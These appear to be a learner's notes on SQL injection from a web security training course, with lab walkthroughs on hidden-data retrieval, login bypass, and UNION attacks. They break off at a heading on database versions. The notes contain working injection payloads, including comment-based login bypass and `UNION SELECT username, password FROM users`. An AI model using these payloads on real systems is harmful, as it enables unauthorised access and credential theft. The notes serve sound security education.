
It is a web application vulnerability that allows an attacker to interfere with queries that an application makes to its database. This allows the attacker to view private data passwords etc.. 
It can also enable them to perform denial-of-service attacks.

## How to detect SQL injection vulnerabilities

Can be done manually by using a set if tests :

- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
  
  
  However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:

- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.
  
## Retrieving hidden data
  
URL : `https://insecure-website.com/products?category=Gifts`

 SQL Query : `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

This SQL query asks the database to return:

- all details (`*`)
- from the `products` table
- where the `category` is `Gifts`
- and `released` is `1`.
now when we replace 1 with 0 we could get all the unreleased data

This is possible when the application doesn't implement any defence against SQL attacks
URL: `https://insecure-website.com/products?category=Gifts'--`


SQL query :       `SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

here `--` represents comment this means that part after Gifts got commented out and if this was successful all the data would be shown 

**OR**

URL: `https://insecure-website.com/products?category=Gifts'+OR+1=1--`

SQL Query: `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`

here 1=1 is always true therefore it will return all items inside category

`Warning : Take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.`



## Subverting application logic

Imagine an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:

Query: `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:

HAck: `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

This query returns the user whose `username` is `administrator` and successfully logs the attacker in as that user.

## SQL Injection Union Attacks

When an application is vuln to sql attacks we can use keyword `UNION` to retrieve data from other tables within the database...
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

This SQL query returns a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.

Union lets us execute one or more Select queries.

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.
To do this we use

To determine the number of columns :
` ORDER BY 1--  
`ORDER BY 2-- '
`ORDER BY 3-- 
`etc.`

we can do this by injecting a payload in burpsuite intruder

The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.


The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:

`' UNION SELECT NULL-- ' 
`UNION SELECT NULL,NULL-- ' 
`UNION SELECT NULL,NULL,NULL-- 
`etc.`

If the number of nulls does not match the number of columns, the database returns an error, such as:

Explanation : We use `NULL` as the values returned from the injected `SELECT` query because the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

As with the `ORDER BY` technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.

### Lab: SQL injection UNION attack, determining the number of columns returned by the query

TO SOLVE :

send this request in repeater
![[Pasted image 20250511232329.png]]

now in front of Pets 'UNION+SELECT+NULL,NULL,,NULL'
until we get correct no of columns

**LAB SOLVED**

## Database-specific syntax
On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:

`' UNION SELECT NULL FROM DUAL--`


For More Information go to [[SQL Injection Cheat Sheet]] for queries of different types of database..


## Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

`' UNION SELECT 'a',NULL,NULL,NULL-- ' UNION SELECT NULL,'a',NULL,NULL-- ' UNION SELECT NULL,NULL,'a',NULL-- ' UNION SELECT NULL,NULL,NULL,'a'--`

If the column data type is not compatible with string data, the injected query will cause a database error, such as:

`Conversion failed when converting the varchar value 'a' to data type int.`

If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.


In short ignore it
Lets see the practical approach ->


### Lab: SQL injection UNION attack, finding a column containing text



![[Pasted image 20250512004102.png]]

**link req** : `0a68002d04ed0c7080e07be700c30042.web-security-academy.net/filter?category=Accessories' +UNION+SELECT+NULL, 'String_REQ' ,NULL--`

*make sure there is space before adding the union or the current dataset wont be visible*
 
here we take a dataset with 4 columns:
`UNION SELECT 'a',NULL,NULL,NULL-- 
`' UNION SELECT NULL,'a',NULL,NULL-- 
`' UNION SELECT NULL,NULL,'a',NULL-- 
`' UNION SELECT NULL,NULL,NULL,'a'--`

by doing this we find which column is capable of holding a string then we could insert a string in it......
*In short to add data we use this*

## Using a SQL injection UNION attack to retrieve interesting data


When we know the number of columns in dataset and can find which columns has string value of data we are in position to retrieve some useful data.....

In this example, you can retrieve the contents of the `users` table by submitting the input:

`' UNION SELECT username, password FROM users--`
-> in this example we are trying to retrieve username and password from column user
Lets perform a lab related to it......
	
### Lab: SQL injection UNION attack, retrieving data from other tables

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

First we check if we the number of columns:
`' UNION+SELECT+NULL,NULL--

Then we check which column contains string using->
`' UNION+SELECT+'A',NULL`

Then we print out the usernames and passwords from the user column by ->
`' UNION SELECT username, password FROM users--`

Now for further exploitation.........

## Retrieving multiple values within a single column

`' UNION SELECT username || '~' || password FROM users--`

`||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character

Output ->
`administrator~s3cure 
`wiener~peter 
`carlos~montoya`

Different databases use different syntax to perform string concatenation. For more details, see the [[SQL Injection Cheat Sheet]] .
		 
### Lab: SQL injection UNION attack, retrieving multiple values in a single column

![[Pasted image 20250512011633.png]]
send to repeater
![[Pasted image 20250512011717.png]]

`GET /filter?category=Accessories'+UNION+SELECT+NULL,NULL-- HTTP/2
found out that it has 2 columns

lets find the ones with string in it 

![[Pasted image 20250512011846.png]]
`GET /filter?category=Accessories'+UNION+SELECT+NULL,'a'-- HTTP/2`
the 2nd column has string in it

now lets retrieve the data for password

![[Pasted image 20250512012144.png]]

`GET /filter?category=Accessories'+UNION+SELECT+null,username||'~'||password+FROM+users-- HTTP/2

**Proof of Work: **
![[Pasted image 20250512012259.png]]


## Examining the database in SQL injection attacks

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains.

### Querying the database type and version
